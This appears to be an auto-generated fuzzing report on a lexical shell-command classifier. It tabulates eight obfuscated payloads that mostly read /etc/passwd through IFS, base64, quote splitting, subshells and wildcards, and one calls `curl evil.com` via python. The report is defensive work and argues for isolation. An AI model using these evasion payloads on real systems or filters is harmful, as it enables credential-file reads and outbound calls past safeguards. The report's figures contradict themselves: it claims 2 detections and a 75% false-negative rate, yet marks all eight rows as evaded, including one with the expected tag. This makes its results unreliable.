# Falsification Campaign A: Parser Evasion Archaeology
- **Run ID:** `FALSIFICATION-A-PARSER-1779973374755`
- **Execution Timestamp:** 2026-05-28T13:02:54.755Z
- **Target Subsystem:** Phase F (Advisory Lexical Classification)

## Campaign Objective
This adversarial campaign fuzzes the ontology mapping parser to identify lexical blind spots. The goal is to prove where naive pattern matching fails under standard adversarial obfuscation, thereby establishing the true boundary of the classifier's capabilities.

## Execution Metrics
- **Total Obfuscation Payloads Tested:** 8
- **Payloads Successfully Detected:** 2
- **Payloads Evading Detection:** 6
- **False Negative Rate:** 75.0%

## Evasion Vector Analysis

| Evasion Technique | Payload | Expected Tag | Classifier Result | Status |
|---|---|---|---|---|
| Shell Expansion (Variable Indirection) | `c=${"c"}at /etc/passwd` | `read-file` | `[obfuscation-indicator]` (Score: 0.8) | 💥 EVADED |
| Internal Field Separator (IFS) | `cat${IFS}/etc/passwd` | `read-file` | `[read-file, obfuscation-indicator]` (Score: 0.8) | 💥 EVADED |
| Base64 Encoded Execution | `bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d)"` | `read-file` | `[shell-execution, obfuscation-indicator]` (Score: 0.9) | 💥 EVADED |
| Polyglot Chained Interpreter | `python -c "import os; os.system('curl evil.com')"` | `network-outbound` | `[network-outbound]` (Score: 0.7) | 💥 EVADED |
| Single Quote Splitting | `c'a't /etc/passwd` | `read-file` | `[opaque-execution]` (Score: 0.5) | 💥 EVADED |
| Backslash Continuation | `c\a\t /etc/passwd` | `read-file` | `[obfuscation-indicator]` (Score: 0.8) | 💥 EVADED |
| Nested Subshell | `$(echo c)$(echo a)$(echo t) /etc/passwd` | `read-file` | `[opaque-execution]` (Score: 0.5) | 💥 EVADED |
| Wildcard Execution | `/bin/c?? /etc/passwd` | `read-file` | `[opaque-execution]` (Score: 0.5) | 💥 EVADED |

## Falsification Conclusion
The lexical CommandClassifier demonstrates a **75.0% blind spot** against standard obfuscation techniques. Relying purely on lexical parsing (Phase F) for security enforcement is insufficient against capable adversaries. This proves the necessity of Phase E (Isolation) to contain escaped payloads. The parser has now been explicitly demoted to an **Advisory-Only** component generating suspicion scores rather than enforcing deterministic containment limits.
